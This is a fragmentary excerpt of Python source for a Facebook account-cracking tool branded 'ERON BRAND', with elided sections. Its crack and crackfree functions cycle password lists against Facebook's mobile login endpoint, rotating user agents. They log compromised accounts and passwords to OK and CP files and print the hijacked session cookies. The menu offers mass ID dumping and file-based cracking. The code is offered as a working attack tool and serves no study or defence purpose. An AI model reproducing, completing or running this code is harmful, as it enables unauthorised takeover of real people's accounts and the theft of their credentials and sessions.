...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/ERON BRAND.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
while attemps < 12345677901:
    ...
    if username == 'ERON' and password == 'BRAND':
...
\033[1;92m╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝
   ...
   ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
   \033[1;97m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
   ║    Author                   • \33[1;38mSM-ERON BRAND ]\33[1;38m    ║\033[1;31m 
   ║    Facebook                 • ERON BRAND King ]  ║  \033[1;97m  
   ║    Github                   • \33[1;38mERON BRAND-BRAND ]  ║\33[1;34m   
...
os.system('espeak -a 300 " Welcome,   to,  ERON BRAND,  BRAND,  Tools"')
pass
...
def login():
    try:
        ...
        try:
            ...
            login_lagi334()
        except requests.exceptions.ConnectionERON:
            print('\033[0;97m=================')
...
def menu():
    ...
    print('\033[0;97m=================')
    ERONBRAND = input('\x1b[1;92m[+] CHOOSE: ')
    if ERONBRAND in ['111']:
        login()
        dump_massal()
    elif ERONBRAND in ['1']:
        crack_file()
    elif ERONBRAND in ['2','02']:
        os.system('xdg-open https://www.facebook.com/ERON BRAND.khadka.587')
        os.system("python nono.py")
    elif ERONBRAND in ['3','03']:
        result()
    elif ERONBRAND in ['0']:
...
def passwrd():
    ...
    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mJAY ERON BRAND VAN Speed Up KO LAAGI')
    print('\033[0;97m===============================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}•[ERON BRANDM1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[ERON BRAND-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[ERON BRAND-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " ERON BRAND,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[ERON BRAND-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•ERON BRAND-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•ERON BRAND-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  ERON BRAND,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
